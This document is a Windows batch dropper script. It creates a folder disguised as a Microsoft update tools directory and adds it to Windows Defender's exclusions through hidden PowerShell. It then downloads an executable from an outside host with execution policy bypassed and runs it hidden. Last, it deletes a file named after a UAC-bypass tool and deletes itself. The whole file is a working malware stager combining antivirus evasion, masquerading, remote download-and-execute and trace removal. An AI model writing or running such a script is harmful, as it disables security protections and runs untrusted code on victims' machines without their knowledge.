@echo off
set SystemRoot=C:\Windows
set "STAGE=C:\Program Files\Microsoft Update Health Tools\Tools"

mkdir "%STAGE%" 2>nul

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Add-MpPreference -ExclusionPath '%STAGE%'"

if not exist "%STAGE%\test.exe" C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -Ep Bypass -WindowStyle Hidden -C "Invoke-WebRequest 'https://downloads.sourceforge.net/project/simple-calc/bin/Calculator.exe?ts=gAAAAABq_ViNHrue_EU8tv9btzypJRgLO4vGSsCNFEYVL0nlSTVOnHfNK-Uex9cn1pQrzWXw92BctBb63jCdtbpfvwiaOULMzA%3D%3D&r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fsimple-calc%2Ffiles%2Flatest%2Fdownload' -OutFile '%STAGE%\test.exe' -UseBasicParsing"
cd /d "%STAGE%"
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -WindowStyle Hidden -C "Start-Process '%STAGE%\test.exe' -WindowStyle Hidden


start "" /b cmd /c "ping -n 11 127.0.0.1 >nul & del /f /q ""%TEMP%\Akagi64.exe"""

(goto) 2>nul & del "%~f0"
